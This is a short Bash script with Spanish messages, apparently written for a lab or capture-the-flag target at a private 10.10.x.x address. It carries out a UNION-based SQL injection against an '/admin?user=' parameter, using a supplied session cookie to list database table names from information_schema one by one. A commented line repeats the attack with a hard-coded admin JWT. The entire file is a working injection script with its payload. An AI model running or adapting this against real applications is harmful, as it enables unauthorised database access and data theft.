#!/bin/bash

function ctrl_c(){
	echo "[!] Saliendo ...\n"
	tput cnorm; exit 1
}

trap ctrl_c INT

tput civis

if [ $1 ] && [ $2 ]; then
	declare -r token=$1
	declare -r contador=$2
	declare -r main_url="http://10.10.1.222"

	echo
	for i in $(seq 1 $contador); do
		echo -en  "\n[*] Tabla [$i]:"
		curl -s -H "Cookie: token=$token" -X GET "$main_url/admin?user=-1%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20limit%20$i,1#" | grep "User" | tail -n 1 | awk '{print $2}'
	done
else
	echo -e "[*] Uso ./sqli.sh <token> <valor>\n"
	tput cnorm
fi

tput cnorm


#curl -s -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjEwMTY1MTZ9.ZpX0s6JqlrSNVCxZIVZ7YoAZNZ8_JVhgvb29WVQ5NuY" -X GET "http://10.10.179.253/admin?user=-1%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20limit%202,1#" | grep "User" | tail -n 1 | awk "{print $2}"
